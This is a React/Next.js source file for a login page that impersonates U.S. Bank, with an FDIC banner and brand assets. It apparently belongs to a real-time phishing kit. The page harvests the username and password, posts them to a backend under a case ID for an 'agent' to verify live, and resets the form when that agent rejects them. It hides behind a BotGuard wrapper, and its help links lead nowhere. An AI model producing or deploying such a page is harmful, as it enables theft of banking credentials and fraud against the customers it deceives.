'use client';

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { Eye, EyeOff, AlertCircle, Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function CredentialsPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId } = useSessionStore();
  const { agentMessage } = useSessionStore();

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  /**
   * Reset form when agent rejects submission
   */
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setUsername('');
      setPassword('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  /**
   * Handle form submission
   */
  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!username.trim()) {
        setFieldError('Please enter your username');
        return;
      }

      if (!password) {
        setFieldError('Please enter your password');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            username: username.trim(),
            password,
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your credentials. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your credentials...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [username, password, sessionUuid, caseId]
  );

  // Determine if we're in a waiting/loading state
  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      <div className="fdic-box">
        <img className="fdic-logo" src="/brands/us-bank/fdic-logo.svg" alt="FDIC" />
        <span className="fdic-text">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
      </div>

      <section className="login-header">
        <h2>Account login</h2>
      </section>

      <form className="login-form" onSubmit={handleSubmit}>
        {/* Username */}
        <div className={`form-group ${(!username.trim() && isSubmitting) || (fieldError && !password && !username) ? 'error' : ''}`}>
          <input
            type="text"
            id="username"
            name="username"
            className="input-field"
            autoComplete="username"
            placeholder=" "
            value={username}
            onChange={(e) => {
              setUsername(e.target.value);
              if (fieldError) setFieldError('');
            }}
            disabled={isWaiting}
          />
          <label htmlFor="username" className="input-label">Username</label>
        </div>

        {/* Remember Me */}
        <div className="checkbox-group">
          <input type="checkbox" id="remember" name="remember" disabled={isWaiting} />
          <label htmlFor="remember" className="checkbox-label">Remember my username</label>
        </div>

        {/* Password */}
        <div className={`form-group ${(!password && isSubmitting) || (fieldError && !password && !username) ? 'error' : ''}`} style={((!password && isSubmitting) || (fieldError && !password && !username)) || fieldError || error ? { marginBottom: '4px' } : {}}>
          <input
            type={showPassword ? "text" : "password"}
            id="password"
            name="password"
            className="input-field"
            autoComplete="current-password"
            placeholder=" "
            value={password}
            onChange={(e) => {
              setPassword(e.target.value);
              if (fieldError) setFieldError('');
            }}
            disabled={isWaiting}
          />
          <label htmlFor="password" className="input-label">Password</label>
          <button
            type="button"
            className="show-hide-btn"
            onClick={() => setShowPassword(!showPassword)}
            disabled={isWaiting}
          >
            {showPassword ? 'Hide' : 'Show'}
          </button>
        </div>

        {/* Global/Field Error Display */}
        {fieldError && (
          <div className="error-message" style={{ marginBottom: '20px', display: 'flex', alignItems: 'center', gap: '8px' }}>
            <AlertCircle className="h-4 w-4" />
            <span>{fieldError}</span>
          </div>
        )}
        {(error && !fieldError) && (
          <div className="error-message" style={{ marginBottom: '20px', display: 'flex', alignItems: 'center', gap: '8px' }}>
            <AlertCircle className="h-4 w-4" />
            <span>{error}</span>
          </div>
        )}

        {/* Inline waiting feedback */}
        {status === 'waiting' && !fieldError && (
          <div className="mb-4 text-center">
            <p className="text-[#0c2074] font-medium text-sm animate-pulse">
              Verifying your credentials with secure server...
            </p>
          </div>
        )}

        <button
          type="submit"
          className="btn btn-primary"
          disabled={isWaiting}
          style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '8px' }}
        >
          {isWaiting && <Loader2 className="h-4 w-4 animate-spin" />}
          {isWaiting ? 'Processing...' : 'Log in'}
        </button>

        <div className="link-group">
          <a href="#" className="link arrow">Forgot username or password</a>
          <a href="#" className="link subtle">Enroll in online banking</a>
          <a href="#" className="link subtle">Corporate & Commercial banking login</a>
        </div>
      </form>
    </BotGuard>
  );
}

